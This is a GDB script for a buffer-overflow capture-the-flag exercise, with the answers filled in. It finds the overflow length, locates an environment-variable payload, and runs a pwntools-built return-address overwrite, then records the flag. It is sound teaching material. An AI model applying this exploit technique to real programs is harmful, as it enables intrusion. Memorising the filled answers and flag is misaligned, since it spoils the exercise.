set logging file /dev/null
set logging redirect on
set logging enabled on
# For this challenge, please replace any occurence of `<TODO>` after this line with your answer. 
# There is no need to change anything else, unless otherwise specified.
# Make sure that the final script contains valid GDB commands before submitting, and that it works properly, 
# by running `FLAGCODE=$(cat flagcode.bin) gdb notes --batch -x script.gdb`.


# This binary contains a buffer overflow. The goal will be to use this buffer overflow to overwrite a return pointer,
# with a pointer to the code in the file `flagcode.bin`, which will print the flag. To do so, we need to load the 
# code into this program's memory. We will do this by setting it in the environment variable `FLAGCODE`. 
# As there's no good way to do this within GDB, please do so outside of GDB instead (see the command above).
# The code below should print the flagcode, which will look like gibberish. If it is not printed, it's not set in your environment.

set logging enabled off
show env FLAGCODE
set logging enabled on


# [Part 1]

# [1.1] To start, let's first see what the stack looks like when the buffer overflow happens.
# To do so, let's first put a breakpoint on the instruction immediately after the buffer we 
# can overflow is written to, and run the program to get there.
break *save_note+138
run AAAAAAAA

# This should be a good point to look at the stack layout, to construct our payload.

# [1.2] How many bytes long should our input be at minimum to overwrite the entire return pointer?
# For this question, assume we need to overwrite all bytes of the return pointer, with no 0-bytes at all.
set $byte_count = 0x52

# [1.3] Our payload will overwrite other values on the stack, which might change the control flow.
# Which variable on the stack should we not overwrite, to make sure the overwritten return pointer is used?
set $stack_variable = save_note::success

# [1.4] Where in memory is the value of our `FLAGCODE` environment variable stored? 
# This is also the address we want to jump to, to execute the payload.
# Use C code to retrieve it's address, do not hardcode it.
set $flagcode_address = (void *)getenv("FLAGCODE")

# [Part 2]

set logging enabled off
printf "Byte count: %d\n", $byte_count
printf "Flagcode address: 0x%lx\n", $flagcode_address
delete

# [2.1] Now that we have everything we need, let's build the payload, and run the program with it.
# How do we run the program with our payload? You can pass shell commands to `run` as arguments with $().
# You can use this to construct the payload within Python.
run $(python3 -c "import sys; from pwn import *; sys.stdout.buffer.write(b'\x01' * 0x52 + p64(0x7fffffffec97))")

# [2.2] If your payload worked properly, you should've found the flag. 
# What is the flag? Put your answer in double quotes (") like a string.
set $flag = "flag{N0Sh3llc0d3Y3t}"

# Try running the binary with the same payload outside of GDB. Does it still work? Why?
